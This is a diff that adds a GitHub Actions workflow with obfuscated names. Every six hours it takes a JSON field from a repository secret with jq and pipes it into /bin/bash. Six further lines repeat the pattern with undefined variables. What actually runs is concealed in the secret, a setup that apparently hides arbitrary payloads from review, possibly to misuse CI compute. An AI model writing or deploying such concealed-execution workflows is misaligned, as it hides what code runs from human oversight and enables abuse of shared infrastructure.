@@ -1,0 +1,25 @@
+name: guazaiunity
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guazaiunity
+        env:
+          iqaqq3323: ${{ secrets.iqaqq3323 }}
+        run: |
+          echo $iqaqq3323 | jq -r .yg9 | /bin/bash
+          echo $qga91525 | jq -r .gwes37 | /bin/bash
+          echo $l37 | jq -r .zqvc46669 | /bin/bash
+          echo $hy44366 | jq -r .ps57 | /bin/bash
+          echo $ctlmp38864 | jq -r .cym16 | /bin/bash
+          echo $aszx5443 | jq -r .zhqhf542 | /bin/bash
+          echo $zbqwo9 | jq -r .elfcc00 | /bin/bash
+
